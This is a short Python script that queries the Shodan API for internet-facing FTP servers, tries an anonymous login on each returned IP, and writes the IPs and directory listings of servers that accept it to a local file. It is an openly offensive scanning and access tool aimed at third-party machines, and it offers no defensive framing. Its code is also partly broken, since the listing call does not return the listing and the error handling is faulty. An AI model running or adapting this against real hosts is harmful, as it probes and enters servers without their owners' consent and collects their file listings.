from ftplib import FTP

try:
    import shodan
except:
    print('You need the Shodan Python module')


key = "" #Insert key here
api = shodan.Shodan(key)


def checkCreds(integer):

    results = api.search('ftp', integer)
    # Show the results
    print('Results found: {}'.format(results['total']))
    try:
        with open('somefile.txt', 'a') as f:
            counter = 0
            for result in results['matches']:
                ip = result['ip_str']
                print(counter)
                print('IP: {}'.format(result['ip_str']))
                try:
                    ftp = FTP(ip)
                    ftp.login()
                    f.write(ip + "\n")
                    f.writelines(ftp.retrlines('LIST'))
                    f.write("\n")
                    print(" \n")
                except:
                    print("Default login not available \n")
                counter += 1
            f.close()
    except shodan.APIError as error:
        print('Error {}'.format(error))
    f.close()

try:
    ##Add this and change 1 to count, if you want more than 100 Resulst
    #zWarning uses all your Query credits
    #for count in range(1,21):
    checkCreds(1)

except FileExistsError:
    print("Error occured")
